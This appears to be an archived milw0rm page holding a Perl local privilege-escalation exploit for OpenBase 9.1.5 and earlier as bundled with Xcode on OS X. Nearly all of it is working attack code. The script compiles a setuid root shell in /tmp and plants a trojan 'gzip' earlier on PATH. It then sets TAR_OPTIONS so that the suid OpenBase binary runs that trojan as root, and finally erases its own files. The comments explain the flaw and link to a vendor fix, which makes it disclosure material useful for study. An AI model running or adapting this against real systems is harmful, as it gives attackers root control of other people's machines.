<html><head><title>Xcode OpenBase <= 9.1.5 Local Root Exploit (OSX)</title></head><pre>#!/usr/bin/perl
#
# http://www.digitalmunition.com
# written by kf (kf_lists[at]digitalmunition[dot]com) 
#
# http://docs.info.apple.com/article.html?artnum=61798 (This won't help)
# ftp://www.openbase.com/pub/OpenBase_10.0 (This will)
#
# This is an exploit for a 3rd party program that has been bundled with Xcode on several occasions. 
# The OpenBase binary calls gnutar while running with euid=0 by passing TAR_OPTIONS we can cause gzip to be 
# invoked. Since no path is specified we can export PATH=/path/to/trojan:$PATH in order to take root.

$binpath = &quot;/Library/OpenBase/bin/OpenBase&quot;; # Typical location. 

# In this instance targets are really pointless but I wanted to archive known vulnerable versions while testing. 
$tgts{&quot;0&quot;} = &quot;xcode_2-1.2_8m654_018213974.dmg:$binpath &quot;;
$tgts{&quot;1&quot;} = &quot;OpenBase9.1.5_MacOSX.dmg:$binpath &quot;;
$tgts{&quot;2&quot;} = &quot;OpenBase8.0.4_MacOSX.dmg:$binpath &quot;;
$tgts{&quot;3&quot;} = &quot;OpenBase7.0.15_MacOSX.dmg:$binpath &quot;;

unless (($target) = @ARGV) {
        print &quot;\n\nUsage: $0 &lt;target&gt; \n\nTargets:\n\n&quot;;

        foreach $key (sort(keys %tgts)) {
                ($a,$b) = split(/\:/,$tgts{&quot;$key&quot;});
                print &quot;\t$key . $a\n&quot;;
        }

        print &quot;\n&quot;;
        exit 1;
}

$ret = pack(&quot;l&quot;, ($retval));
($a,$b) = split(/\:/,$tgts{&quot;$target&quot;});
print &quot;*** Target: $a $b\n&quot;;

open(OP,&quot;&gt;/tmp/proactive.c&quot;);
printf OP &quot;main()\n&quot;; 
printf OP &quot;{ seteuid(0); setegid(0); setuid(0); setgid(0); system(\&quot;/bin/sh -i\&quot;); }\n&quot;;
system(&quot;gcc -o /tmp/shX /tmp/proactive.c&quot;); 

open(OP,&quot;&gt;/tmp/or_really_reactive.c&quot;);
printf OP &quot;main()\n&quot;; 
printf OP &quot;{ system(\&quot;chown root: /tmp/shX; chmod 4755 /tmp/shX; rm -rf /tmp/or_really_reactive.c /tmp/proactive.c /tmp/pwndertino.* /tmp/gzip\&quot;); }\n&quot;;
system(&quot;gcc -o /tmp/gzip /tmp/or_really_reactive.c&quot;); 

system(&quot;mkdir /tmp/pwndertino.db&quot;);
system(&quot;echo \&quot;Way to proactively audit 3rd party binaries before cramming them into a release \&quot;&gt; /tmp/pwndertino.db/port&quot;);
system(&quot;echo \&quot;I wonder how long these vulnerable suids have been bundled with xcode \&quot;&gt; /tmp/pwndertino.db/encoding&quot;);
system(&quot;echo \&quot;All your Mac are belong to us \&quot;&gt; /tmp/pwndertino.db/threads&quot;);
system(&quot;echo \&quot;Welcome to pwndertino \&quot;&gt; /tmp/pwndertino.db/notification&quot;);
system(&quot;echo \&quot;For the protection of our customers, Apple does not disclose, discuss, or confirm security issues until a full investigation has occurred and any necessary patches or releases are available \&quot;&gt; /tmp/pwndertino.db/simulationMode&quot;);
system(&quot;echo \&quot;To learn more about Apple Product Security, see the Apple Computer Product Security Incident Response website\&quot; &gt; /tmp/pwndertino.db/safe_sql_mode&quot;);

system(&quot;export TAR_OPTIONS=\&quot;-zv /etc/master.passwd\&quot;; export PATH=/tmp:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin;$b ../../../../../../tmp/pwndertino&quot;);

system(&quot;/tmp/shX&quot;);

# milw0rm.com [2006-10-15]</pre></html>